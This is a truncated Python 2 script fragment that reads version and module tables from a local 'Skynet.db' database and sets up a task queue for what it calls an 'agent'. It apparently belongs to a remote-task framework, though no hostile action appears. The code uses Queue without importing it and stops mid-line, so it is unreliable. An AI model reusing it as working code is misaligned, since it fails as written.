import ctypes
import ctypes.util
import threading
import sqlite3
import random
import string
import base64
import subprocess

curr_version = 1

work_folder = "./"
work_db = work_folder+"Skynet.db"

connection = sqlite3.connect(work_db)
try:
    with connection:
        cursor = connection.cursor()
        cursor.execute("SELECT version FROM cfg")
        res = cursor.fetchone()
        if res:
            if res[0] > curr_version:
                print "You're using a newer client. Your agent will not run."
            elif res[0] < curr_version:
                print "You're using an older client. Please upgrade."
except Exception as e:
    print e

connection = sqlite3.connect(work_db)
with connection:
    cursor = connection.cursor()
    cursor.execute("SELECT * FROM modules")
    module_list = cursor.fetchall()

task_queue = Queue.Queue()

if len(module_list) == 0:
    task_queue.put("return
